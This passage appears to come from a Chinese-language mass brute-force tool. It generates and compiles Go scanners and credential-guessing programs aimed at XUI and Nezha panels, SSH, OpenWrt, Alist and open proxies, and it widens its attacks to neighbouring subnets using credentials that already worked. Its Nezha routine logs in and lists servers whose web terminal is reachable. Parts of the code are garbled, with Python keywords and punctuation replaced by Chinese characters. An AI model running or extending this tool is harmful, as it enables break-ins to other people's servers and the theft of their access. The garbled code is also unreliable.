    "		base := fmt.Sprintf(\"%s://%s:%s\", proto, ip, port)",
    "		testURL := base + \"/api/me\"",
    "		ctx, cancel := context.WithTimeout(context.Background(), ({timeout} + 1) * time.Second)",
    "		req, err := http.NewRequestWithContext(ctx, \"GET\", testURL, nil)",
    "		if err != nil { cancel(); continue }",
    "		req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "		req.Header.Set(\"Connection\", \"close\")",
    "		resp, err := httpClient.Do(req)",
    "       cancel()",
    "		if err != nil {",
    "			if resp != nil { resp.Body.Close() }",
    "			continue",
    "		}",
    "		if isValidResponse(resp) {",
    "			file.WriteString(base + \"\\n\")",
    "			resp.Body.Close()",
    "			return",
    "		}",
    "		resp.Body.Close()",
    "	}",
    "}",
    "func isValidResponse(resp *http.Response) bool {",
    "	if resp == nil { return false }",
    "	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))",
    "	if err != nil { return false }",
    "	var data map[string]interface{}",
    "	if err := json.Unmarshal(body, &data); err != nil { return false }",
    "	if v, ok := data[\"code\"]; ok {",
    "		switch t := v.(type) {",
    "		case float64:",
    "			return int(t) == 200",
    "		case string:",
    "			return t == \"200\"",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 {",
    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
    "		os.Exit(1)",
    "	}",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" {",
    "			fields := strings.Fields(line)",
    "			if len(fields) > 0 {",
    "				tasks <- fields[0]",
    "			}",
    "		}",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# TCP 端口活性测试模板
TCP_ACTIVE_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"net\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	for line := range tasks {",
    "		ipPort := strings.TrimSpace(line)",
    "		if _, _, err := net.SplitHostPort(ipPort); err != nil { continue }",
    "		conn, err := net.DialTimeout(\"tcp\", ipPort, {timeout}*time.Second)",
    "		if err == nil {",
    "			conn.Close()",
    "			file.WriteString(ipPort + \"\\n\")",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# TCP 预扫描模板
TCP_PRESCAN_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"net\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	for ipPort := range tasks {",
    "		ipPort = strings.TrimSpace(ipPort)",
    "		if _, _, err := net.SplitHostPort(ipPort); err != nil {",
    "			continue",
    "		}",
    "		conn, err := net.DialTimeout(\"tcp\", ipPort, {timeout}*time.Second)",
    "		if err == nil {",
    "			conn.Close()",
    "			file.WriteString(ipPort + \"\\n\")",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile)",
    "	if err != nil { return }",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() { tasks <- scanner.Text() }",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]


# 子网TCP扫描模板
SUBNET_TCP_SCANNER_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"fmt\"",
    "	\"net\"",
    "	\"os\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func inc(ip net.IP) {",
    "	for j := len(ip) - 1; j >= 0; j-- {",
    "		ip[j]++",
    "		if ip[j] > 0 { break }",
    "	}",
    "}",
    "func worker(ip net.IP, port string, timeout time.Duration, file *os.File, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	target := fmt.Sprintf(\"%s:%s\", ip.String(), port)",
    "	conn, err := net.DialTimeout(\"tcp\", target, timeout)",
    "	if err == nil {",
    "		conn.Close()",
    "		file.WriteString(target + \"\\n\")",
    "	}",
    "}",
    "func main() {",
    "	if len(os.Args) < 5 {",
    "		fmt.Println(\"Usage: ./subnet_scanner <cidr> <port> <outputFile> <concurrency>\")",
    "		os.Exit(1)",
    "	}",
    "	cidr := os.Args[1]",
    "	port := os.Args[2]",
    "	outputFile := os.Args[3]",
    "   concurrency := 0",
    "   fmt.Sscanf(os.Args[4], \"%d\", &concurrency)",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil {",
    "		fmt.Println(\"无法打开输出文件:\", err)",
    "		return",
    "	}",
    "	defer outFile.Close()",
    "	ip, ipnet, err := net.ParseCIDR(cidr)",
    "	if err != nil {",
    "		fmt.Println(\"无效的CIDR:\", err)",
    "		return",
    "	}",
    "	var wg sync.WaitGroup",
    "   sem := make(chan struct{}, concurrency)",
    "	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {",
    "       sem <- struct{}{}",
    "		wg.Add(1)",
    "		go func(ipCopy net.IP) {",
    "			worker(ipCopy, port, 3*time.Second, outFile, &wg)",
    "           <-sem",
    "		}(append(net.IP(nil), ip...))",
    "	}",
    "	wg.Wait()",
    "}",
]

# ipcx.py 内容
IPCX_PY_CONTENT = r"""import requests
import time
import os
import re
import sys
import json
from openpyxl import Workbook, load_workbook
from openpyxl.utils import get_column_letter
from tqdm import tqdm

def adjust_column_width(ws):
    for col in ws.columns:
        max_length = 0
        column = col[0].column
        column_letter = get_column_letter(column)
        for cell in col:
            try:
                if cell.value:
                    length = len(str(cell.value))
                    if length > max_length:
                        max_length = length
            except:
                pass
        adjusted_width = max_length + 2
        ws.column_dimensions[column_letter].width = adjusted_width

def extract_ip_port(url):
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/]+:\d+)', url)
    if match:
        return match.group(3)
    match = re.search(r'([^:/\s]+:\d+)', url)
    if match:
        return match.group(1)
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/\s]+)', url)
    if match:
        return match.group(3)
    return url.split()[0]

def get_ip_info_batch(ip_list, retries=3):
    url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"
    results = {}
    payload = [{"query": ip_port.split(':')[0]} for ip_port in ip_list]

    for attempt in range(retries):
        try:
            response = requests.post(url, json=payload, timeout=20)
            response.raise_for_status()
            data = response.json()
            for item in data:
                original_ip_port = next((ip for ip in ip_list if ip.startswith(item.get('query', ''))), None)
                if original_ip_port:
                    if item.get('status') == 'success':
                        results[original_ip_port] = [
                            original_ip_port,
                            item.get('country', 'N/A'),
                            item.get('regionName', 'N/A'),
                            item.get('city', 'N/A'),
                            item.get('isp', 'N/A')
                        ]
                    else:
                         results[original_ip_port] = [original_ip_port, '查询失败', '查询失败', '查询失败', '查询失败']
            for ip_port in ip_list:
                if ip_port not in results:
                    results[ip_port] = [ip_port, 'N/A', 'N/A', 'N/A', 'N/A']
            return [results[ip_port] for ip_port in ip_list]
        except requests.exceptions.RequestException as e:
            if attempt < retries - 1:
                time.sleep(2)
            else:
                return [[ip_port, '超时/错误', '超时/错误', '超时/错误', '超时/错误'] for ip_port in ip_list]
    
    return [[ip_port, 'N/A', 'N/A', 'N/A', 'N/A'] for ip_port in ip_list]

def process_ip_port_file(input_file, output_excel):
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]
    
    headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']

    if os.path.exists(output_excel):
        try:
            os.remove(output_excel)
        except OSError as e:
            print(f"无法删除旧的Excel文件 '{output_excel}': {e}。请手动关闭它。")
            return

    wb = Workbook()
    ws = wb.active
    ws.title = "IP信息"
    ws.append(headers)
    wb.save(output_excel)

    targets = []
    for line in lines:
        addr, user, passwd = line, '', ''
        try:
            proxy_match = re.match(r'(\w+://)(?:([^:]+):([^@]+)@)?(.+)', line)
            if proxy_match:
                user = proxy_match.group(2) or ''
                passwd = proxy_match.group(3) or ''
                addr = f"{proxy_match.group(1)}{proxy_match.group(4)}"
            else:
                parts = line.split()
                if len(parts) >= 3:
                    addr, user, passwd = parts[0], parts[1], parts[2]
                elif len(parts) == 2:
                    addr, user = parts[0], parts[1]
                else:
                    addr = parts[0]
        except Exception:
             addr = line.split()[0] if line.split() else ''
        
        ip_port = extract_ip_port(addr)
        if ip_port:
            targets.append({'line': line, 'ip_port': ip_port, 'user': user, 'passwd': passwd})

    chunk_size = 100
    with tqdm(total=len(targets), desc="[📊] IP信息查询", unit="ip", ncols=100) as pbar:
        for i in range(0, len(targets), chunk_size):
            chunk = targets[i:i+chunk_size]
            ip_ports_in_chunk = [target['ip_port'] for target in chunk]
            
            batch_results = get_ip_info_batch(ip_ports_in_chunk)
            
            wb = load_workbook(output_excel)
            ws = wb.active
            
            for original_target, result_data in zip(chunk, batch_results):
                row = [original_target['line'], result_data[0], original_target['user'], original_target['passwd']] + result_data[1:]
                ws.append(row)
            
            wb.save(output_excel)
            pbar.update(len(chunk))
            
            if i + chunk_size < len(targets):
                time.sleep(4.5)

    wb = load_workbook(output_excel)
    ws = wb.active
    adjust_column_width(ws)
    wb.save(output_excel)
    print("\nIP信息查询完成！")


if __name__ == "__main__":
    if len(sys.argv) > 2:
        process_ip_port_file(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python ipcx.py <input_file> <output_file>")
"""

def generate_ipcx_py():
    with open('ipcx.py'， 'w', encoding='utf-8') as f:
        f.write(IPCX_PY_CONTENT)

# 哪吒面板分析函数
def analyze_panel(result_line):
    parts = result_line.split()
    if len(parts) < 3: return result_line, (0， 0, "格式错误")
    ip_port, username, password = parts[0], parts[1], parts[2]
    for protocol in ["http", "https"]:
        base_url = f"{protocol}://{ip_port}"
        session = requests.Session()
        login_url = base_url + "/api/v1/login"
        payload = {"username": username, "password": password}
        try:
            requests.packages。urllib3.disable_warnings()
            res = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            if res.status_code == 200:
                try:
                    j = res.json()
                    is_login_success = "token" in j.get("data", {}) or "nz-jwt" in res.headers.get("Set-Cookie", "")
                    if is_login_success:
                        if "token" in j.get("data", {}):
                            session.headers.update({"Authorization": f"Bearer {j['data']['token']}"})
                        
                        machine_count, term_count, term_servers = 0, 0， []
                        try:
                            server_res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
                            if server_res.status_code == 200:
                                server_data = server_res.json()
                                servers = server_data if isinstance(server_data, list) else server_data.get("data", [])
                                machine_count = len(servers)
                                # 在获取到服务器列表后，再检查终端状态
                                for server 在 servers:
                                    if isinstance(server, dict) and "id" in server:
                                        if check_server_terminal_status(session, base_url, server["id"]):
                                            term_count += 1
                                            term_servers.append(server)

                        except Exception:
                            pass
                        
                        servers_string = ", "。join([s.get('name'， str(s.get('id'， ''))) for s 在 term_servers]) 或 "无"
                        return result_line, (machine_count, term_count, servers_string)
                except Exception:
                    return result_line, (0, 0, "分析失败")
        except requests.exceptions.RequestException:
            continue
    return result_line, (0， 0， "登录失败")

def check_server_terminal_status(session, base_url, server_id):
    try:
        res = session.get(f"{base_url}/dashboard/terminal/{server_id}", timeout=5, verify=False)
        return res.status_code == 200 and "xterm" in res.text.lower()
    except Exception:
        return False


# =========================== 主脚本逻辑 ===========================
# 优先使用 /usr/local/go/bin/go, 其次使用系统路径中的 go
GO_EXEC = "/usr/local/go/bin/go" if os.path.exists("/usr/local/go/bin/go") else "go"

def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
    if not os.path.exists(xlsx_file): return
    try:
        wb = load_workbook(xlsx_file)
        ws = wb.active
        # 添加新的表头
        ws.cell(row=1, column=ws.max_column + 1, value="服务器总数")
        ws.cell(row=1, column=ws.max_column + 1, value="终端畅通数")
        ws.cell(row=1, column=ws.max_column + 1, value="畅通服务器列表")
        for row_idx in range(2, ws.max_row + 1):
            original_address = ws.cell(row=row_idx, column=1).value
            if original_address in analysis_data:
                machine_count, term_count, servers_string = analysis_data[original_address]
                ws.cell(row=row_idx, column=ws.max_column - 2, value=machine_count)
                ws.cell(row=row_idx, column=ws.max_column - 1, value=term_count)
                ws.cell(row=row_idx, column=ws.max_column, value=servers_string)
        wb.save(xlsx_file)
        print("✅ 成功将哪吒面板分析结果写入Excel报告。")
    except Exception as e:
        print(f"❌ 更新Excel文件时发生错误: {e}")

def input_with_default(prompt, default):
    user_input = input(f"{prompt} (默认: {default})：").strip()
    return int(user_input) if user_input.isdigit() else default

def escape_go_string(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')

def generate_go_code(go_file_name, template_lines, **kwargs):
    code = "\n".join(template_lines)
    code = code.replace("{timeout}", str(kwargs.get('timeout', 3)))
    code = code.replace("{semaphore_size}", str(kwargs.get('semaphore_size', 100)))
    if 'usernames' in kwargs:
        user_list_str = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in kwargs['usernames']]) + "}"
        code = code.replace("{user_list}", user_list_str)
    if 'passwords' in kwargs:
        pass_list_str = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in kwargs['passwords']]) + "}"
        code = code.replace("{pass_list}", pass_list_str)
    if 'proxy_type' in kwargs:
        creds_list_str = "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in kwargs.get('credentials', [])]) + "}"
        code = code.replace("{proxy_type}", kwargs['proxy_type']).replace("{auth_mode}", str(kwargs.get('auth_mode', 0))).replace("{creds_list}", creds_list_str)
        if 'test_url' in kwargs:
            code = code.replace('testURL      = "http://myip.ipip.net"', f'testURL      = "{escape_go_string(kwargs["test_url"])}"')
    with open(go_file_name, 'w', encoding='utf-8') as f:
        f.write(code)

def compile_go_program(go_file, executable_name):
    if sys.platform == "win32": executable_name += ".exe"
    print(f"📦 [编译] 正在编译Go程序 {go_file} -> {executable_name}...")
    
    # 为编译创建一个安全的环境
    build_env = os.environ.copy()
    temp_home_created = False
    if 'HOME' not in build_env:
        temp_home = os.path.join(os.getcwd(), ".gohome_build")
        os.makedirs(temp_home, exist_ok=True)
        build_env['HOME'] = temp_home
        print(f"   - ⚠️  未定义 HOME 变量，临时设置为: {temp_home}")
        temp_home_created = True

    if 'GOCACHE' not in build_env:
        build_env['GOCACHE'] = os.path.join(build_env['HOME'], ".cache", "go-build")

    try:
        subprocess.run(
            [GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable_name, go_file], 
            check=True, 
            capture_output=True, 
            env=build_env
        )
        print(f"✅ [编译] Go程序编译成功: {executable_name}")
        return executable_name
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"❌ [编译] Go程序 {go_file} 编译失败!")
        if isinstance(e, FileNotFoundError):
            print(f"   - 错误: 未找到Go命令 '{GO_EXEC}'。请确保Go语言环境已正确安装并配置在系统PATH中。")
        else:
            print(f"   - 错误输出:\n{e.stderr.decode('utf-8', 'ignore')}")
        sys.exit(1)
    finally:
        if temp_home_created and 'temp_home' in locals():
             shutil.rmtree(temp_home, ignore_errors=True)

def adjust_oom_score():
    if sys.platform != "linux": return
    try:
        pid = os.getpid()
        with open(f"/proc/{pid}/oom_score_adj", "w") as f:
            f.write("-500")
        print("✅ [系统] 成功调整OOM Score，降低被系统杀死的概率。")
    except PermissionError:
        print("⚠️  [系统] 调整OOM Score失败：权限不足。")
    except Exception as e:
        print(f"⚠️  [系统] 调整OOM Score时发生未知错误: {e}")

def check_and_manage_swap():
    if sys.platform != "linux": return
    try:
        if psutil.swap_memory().total > 0:
            print(f"✅ [系统] 检测到已存在的Swap空间，大小: {psutil.swap_memory().total / 1024 / 1024:.2f} MiB。")
            return
        total_mem_gb = psutil.virtual_memory().total / (1024**3)
        rec_swap = 2 if total_mem_gb < 2 else (int(total_mem_gb / 2) if total_mem_gb <= 8 else (4 if total_mem_gb <= 32 else 8))
        if input(f"❓ 未检测到Swap。是否创建 {rec_swap}GB 临时Swap文件以提高稳定性？(y/N): ").lower() == 'y':
            swap_file = "/tmp/autoswap.img"
            print(f"   - 正在创建 {rec_swap}GB Swap文件: {swap_file}...")
            try:
                subprocess.run(["fallocate", "-l", f"{rec_swap}G", swap_file], check=True, stderr=subprocess.DEVNULL)
                subprocess.run(["chmod", "600", swap_file], check=True)
                subprocess.run(["mkswap", swap_file], check=True)
                subprocess.run(["swapon", swap_file], check=True)
                atexit.register(cleanup_swap, swap_file)
                print(f"✅ [系统] 成功创建并启用 {rec_swap}GB Swap文件。")
            except Exception as e:
                print(f"❌ [系统] Swap文件创建失败: {e}")
    except Exception as e:
        print(f"❌ [系统] Swap检查失败: {e}")

def cleanup_swap(swap_file):
    print(f"\n   - 正在清理临时Swap文件: {swap_file} ...")
    try:
        subprocess.run(["swapoff", swap_file], check=False)
        os.remove(swap_file)
        print("✅ [系统] 临时Swap文件已清理。")
    except Exception as e:
        print(f"⚠️  [系统] 清理Swap文件失败: {e}")


def is_in_china():
    print("    - 正在通过 ping google.com 检测网络环境...")
    try:
        if subprocess.run(["ping", "-c", "1", "-W", "2", "google.com"], capture_output=True).returncode == 0:
            print("    - 🌍 Ping 成功，判断为海外服务器。")
            return False
        else:
            print("    - 🇨🇳 Ping 超时或失败，判断为国内服务器，将自动使用镜像。")
            return True
    except (FileNotFoundError, Exception):
        print("    - ⚠️  Ping 检测失败，将使用默认源。")
        return False

def check_environment(template_mode, is_china_env):
    print(">>> 正在检查依赖环境...")
    
    go_env = os.environ.copy()
    temp_home_created = False
    if 'HOME' not in go_env:
        temp_home = os.path.join(os.getcwd(), ".gohome_env_check")
        os.makedirs(temp_home, exist_ok=True)
        go_env['HOME'] = temp_home
        print(f"   - ⚠️  未定义 HOME 变量，临时设置为: {temp_home}")
        temp_home_created = True

    go_env['GOPROXY'] = 'https://goproxy.cn,direct' if is_china_env else 'https://proxy.golang.org,direct'
    if 'GOCACHE' not in go_env:
        go_env['GOCACHE'] = os.path.join(go_env['HOME'], ".cache", "go-build")
    
    try:
        subprocess.run([GO_EXEC, "version"], check=True, capture_output=True)

        if not os.path.exists("go.mod"):
            subprocess.run([GO_EXEC, "mod", "init", "xui"], check=True, capture_output=True, env=go_env)
        
        required_pkgs = []
        if template_mode == 6: required_pkgs.append("golang.org/x/crypto/ssh")
        if template_mode in [9, 10, 11]: required_pkgs.append("golang.org/x/net/proxy")
        
        if required_pkgs:
            print("    - 正在安装Go模块...")
            for pkg in required_pkgs:
                subprocess.run([GO_EXEC, "get", pkg], check=True, capture_output=True, env=go_env)
            print("    - ✅ Go模块安装完成。")
            
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        print("\n❌ Go环境配置失败。请确保Go语言已正确安装并位于系统PATH中。")
        if isinstance(e, subprocess.CalledProcessError):
            print(f"   - 错误详情: {e.stderr.decode('utf-8', 'ignore')}")
        sys.exit(1)
    finally:
        if temp_home_created and 'temp_home' in locals():
            shutil.rmtree(temp_home, ignore_errors=True)

    print(">>> ✅ 环境依赖检测完成 ✅ <<<\n")


def process_chunk(chunk_id, lines, executable_name):
    input_file = os.path.join(TEMP_PART_DIR, f"input_{chunk_id}.txt")
    output_file = os.path.join(TEMP_XUI_DIR, f"output_{chunk_id}.txt")
    with open(input_file, 'w', encoding='utf-8') as f: f.write("\n".join(lines))
    try:
        cmd = ['./' + executable_name, input_file, output_file]
        process = subprocess.run(cmd, capture_output=True, check=False)
        if process.returncode != 0:
            if process.returncode in [-9, 137]:
                return (False, f"任务 {chunk_id} 被系统因内存不足而终止(OOM Killed)。")
            else:
                return (False, f"任务 {chunk_id} 失败，返回码 {process.returncode}。\n错误信息:\n{process.stderr.decode('utf-8', 'ignore')}")
        return (True, None)
    finally:
        if os.path.exists(input_file): os.remove(input_file)

def run_scan_in_parallel(lines, executable_name, python_concurrency, chunk_size, desc="⚙️  [扫描] 处理任务块"):
    chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
    print(f"ℹ️  [{desc.split(']')[0][1:]}] 已将 {len(lines)} 个目标分为 {len(chunks)} 个小任务块。")
    with ThreadPoolExecutor(max_workers=python_concurrency) as executor:
        future_to_chunk_id = {executor.submit(process_chunk, i, chunk, executable_name): i for i, chunk in enumerate(chunks)}
        with tqdm(total=len(chunks), desc=desc, ncols=100) as pbar:
            for future in as_completed(future_to_chunk_id):
                chunk_id = future_to_chunk_id[future]
                try:
                    success, error_message = future.result()
                    if not success:
                        print(f"\n❌ {error_message}")
                        if "OOM" in error_message:
                            executor.shutdown(wait=False, cancel_futures=True)
                            raise SystemExit("内存不足，脚本已中止。")
                except Exception as exc:
                    print(f'\n任务 {chunk_id} 执行时产生异常: {exc}')
                pbar.update(1)
    print("\n")

def merge_result_files(prefix, output_name, target_dir):
    files_to_merge = [os.path.join(target_dir, name) for name in sorted(os.listdir(target_dir)) if name.startswith(prefix) and name.endswith(".txt")]
    if not files_to_merge: return
    with open(output_name, "w", encoding="utf-8") as out:
        for f_path in files_to_merge:
            with open(f_path, "r", encoding="utf-8") as f:
                shutil.copyfileobj(f, out)
            os.remove(f_path)

def run_ipcx(final_result_file, xlsx_output_file):
    if os.path.exists(final_result_file) and os.path.getsize(final_result_file) > 0:
        print("\n📊 [报告] 正在查询IP地理位置并生成Excel报告...")
        subprocess.run([sys.executable, 'ipcx.py', final_result_file, xlsx_output_file])

def clean_temp_files():
    print("🗑️  [清理] 正在删除临时文件...")
    for d in [TEMP_PART_DIR, TEMP_XUI_DIR, TEMP_EXPAND_DIR, TEMP_PRESCAN_DIR]:
        shutil.rmtree(d, ignore_errors=True)
    files_to_remove = [
        'xui.go', 'subnet_scanner.go', 'ipcx.py', 'go.mod', 'go.sum', 'tcp_prescan.go',
        'xui_executable', 'xui_executable.exe',
        'subnet_scanner_executable', 'subnet_scanner_executable.exe',
        'tcp_prescan_executable'， 'tcp_prescan_executable.exe'
    ]
    for f in files_to_remove:
        if os.path。exists(f):
            try: os.remove(f)
            except OSError: pass
    print("✅ [清理] 清理完成。")

def choose_template_mode():
    print("请选择爆破模式：\n1. XUI面板\n2. 哪吒面板\n3. SSH\n4. Sub Store\n5. OpenWrt/iStoreOS\n--- 代理模式 ---\n6. SOCKS5 代理\n7. HTTP 代理\n8. HTTPS 代理\n--- 其他面板 ---\n9. Alist 面板\n10. TCP 端口活性检测")
    choices = {"1": 1, "2": 2， "3": 6, "4": 7, "5": 8, "6": 9, "7": 10, "8": 11, "9": 12, "10": 13}
    while True:
        choice = input("输入 1-10 之间的数字 (默认: 1)：")。strip() 或 "1"
        if choice in choices: return choices[choice]
        print("❌ 输入无效，请重新输入。")

def load_credentials(template_mode):
    if template_mode in [7, 12, 13]: return [], [], [] # No creds needed
    use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ")。strip().lower()
    if use_custom == 'y':
        if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
            print("❌ 错误: 缺少 username.txt 或 password.txt 文件。"); sys.exit(1)
        with open("username.txt"， 'r', encoding='utf-8-sig', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open("password.txt"， 'r', encoding='utf-8-sig', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        if template_mode == 2:
            passwords = [p for p 在 passwords if len(p) >= 8 或 p == 'admin']
            if not passwords: print("❌ 错误: 过滤后，密码字典为空。"); sys.exit(1)
        if not usernames or not passwords: print("❌ 错误: 用户名或密码文件为空。"); sys.exit(1)
        return usernames, passwords, []
    else:
        return ["root"] if template_mode == 8 else ["admin"], ["password"] if template_mode == 8 else ["admin"], []

def parse_result_line(line):
    proxy_match = re.match(r'(\w+)://(?:([^:]+):([^@]+)@)?([\d\.]+):(\d+)', line)
    if proxy_match:
        user, password, ip, port = proxy_match.group(2) or '', proxy_match.group(3) or '', proxy_match.group(4), proxy_match.group(5)
        return ip, port, user, password
    parts = line.split()
    if len(parts) >= 1:
        ip_port = parts[0]
        user = parts[1] if len(parts) > 1 else ''
        password = parts[2] if len(parts) > 2 else ''
        if ':' 在 ip_port:
            ip, port = ip_port.split(':'， 1)
            return ip, port, user, password
    return 无， 无, 无, None

def scan_single_cluster(cluster_info):
    cluster_id, subnet_prefix, port, user, password, subnet_size, subnet_scanner_executable, _ = cluster_info
    newly_verified = set()
    cidr = f"{subnet_prefix}.0.0/{subnet_size}" if subnet_size == 16 else f"{subnet_prefix}.0/{subnet_size}"
    scan_output = os.path.join(TEMP_EXPAND_DIR, f"scan_{cluster_id}.tmp")
    try:
        cmd = ['./' + subnet_scanner_executable, cidr, port, scan_output, str(params.get('semaphore_size', 100) * 2)]
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        if not os.path.exists(scan_output) or os.path.getsize(scan_output) == 0: return newly_verified
        with open(scan_output, 'r') as f, master_results_lock:
            ips_to_verify = {line.strip() for line in f} - {l.split()[0] for l in master_results}
        if not ips_to_verify: return newly_verified
        
        verify_input = os.path.join(TEMP_EXPAND_DIR, f"verify_in_{cluster_id}.tmp")
        verify_output = os.path。join(TEMP_EXPAND_DIR, f"verify_out_{cluster_id}.tmp")
        with open(verify_input, 'w') as f: f.write("\n".join(ips_to_verify))

        # Compile a temporary, specific executable for this cluster
        temp_go = f"expand_{cluster_id}.go"
        temp_exec = f"expand_exec_{cluster_id}"
        temp_params = {**params, 'usernames': [user], 'passwords': [password]}
        generate_go_code(temp_go, template_map[TEMPLATE_MODE], **temp_params)
        executable = compile_go_program(temp_go, temp_exec)
        
        if executable:
            subprocess.run(['./' + executable, verify_input, verify_output], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            if os.path.exists(verify_output):
                with open(verify_output, 'r') as f:
                    newly_verified.update(line.strip() for line 在 f)
    except Exception:
        pass
    finally:
        for f in [scan_output, verify_input, verify_output, temp_go, temp_exec, temp_exec + ".exe"]:
            if os.path.exists(f): os.remove(f)
    return newly_verified

def expand_scan_with_go(result_file, main_brute_executable, subnet_scanner_executable, subnet_size, python_concurrency):
    if not os.path.exists(result_file) or os.path.getsize(result_file) == 0: return set()
    print("\n🔍 [扩展] 正在分析结果以寻找可扩展的IP网段...")
    global master_results, master_results_lock
    with open(result_file, 'r', encoding='utf-8') as f: master_results = {line.strip() for line in f}
    master_results_lock = Lock()
    ips_to_analyze = master_results.copy()
    for i in range(2):
        print(f"\n--- [扩展扫描 第 {i + 1}/2 轮] ---")
        groups = {}
        for line in ips_to_analyze:
            ip, port, user, password = parse_result_line(line)
            if not ip or not port: continue
            subnet_prefix = ".".join(ip.split('.')[:2]) if subnet_size == 16 else ".".join(ip.split('.')[:3])
            key = (subnet_prefix, port, user, password)
            groups.setdefault(key, set()).add(ip)
        
        expandable_targets = [key for key, ips in groups.items() if len(ips) >= 2]
        if not expandable_targets:
            print(f"  - 第 {i + 1} 轮未找到符合条件的IP集群，扩展扫描结束。"); break
        print(f"  - 第 {i + 1} 轮发现 {len(expandable_targets)} 个可扩展的IP集群，开始并行扫描...")
        
        newly_verified_this_round = set()
        tasks = [(idx, *key, subnet_size, subnet_scanner_executable, main_brute_executable) for idx, key in enumerate(expandable_targets)]
        with ThreadPoolExecutor(max_workers=python_concurrency) as executor:
            future_to_cluster = {executor.submit(scan_single_cluster, task): task for task in tasks}
            with tqdm(total=len(tasks), desc="[💥] 并行扩展集群", ncols=100) as pbar:
                for future in as_completed(future_to_cluster):
                    cluster_results = future.result()
                    if cluster_results:
                        with master_results_lock:
                            new_finds = cluster_results - master_results
                            if new_finds:
                                newly_verified_this_round.update(new_finds)
                                master_results.update(new_finds)
                    pbar.update(1)
        print(f"\n  - ✅ 第 {i + 1} 轮并行扫描完成，共发现 {len(newly_verified_this_round)} 个新目标。")
        if not newly_verified_this_round:
            print(f"--- 第 {i + 1} 轮未发现任何全新的IP，扩展扫描结束。 ---"); break
